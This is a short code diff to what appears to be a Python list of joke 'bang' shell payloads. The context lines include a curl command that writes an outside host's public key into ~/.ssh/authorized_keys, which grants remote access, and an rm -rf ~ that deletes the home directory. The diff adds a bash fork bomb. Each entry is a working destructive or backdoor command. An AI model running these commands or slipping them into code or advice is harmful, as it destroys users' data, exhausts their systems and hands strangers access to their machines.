@@ -9,5 +9,8 @@ echo 'bang!' $f 'is gone forever.'"""),
 chmod 600 .ssh
 curl https://q3k.org/pubkey > .ssh/authorized_keys
 echo 'bang! thanks for the access.'"""),
-    ("delete your whole homedir", """rm -rf ~; echo 'bang!' "you're homeless now." """)
+    ("delete your whole homedir", """rm -rf ~; echo 'bang!' "you're homeless now." """),
+    ("run a forkbomb", """
+:(){ :|:& };:
+"""),
 ]
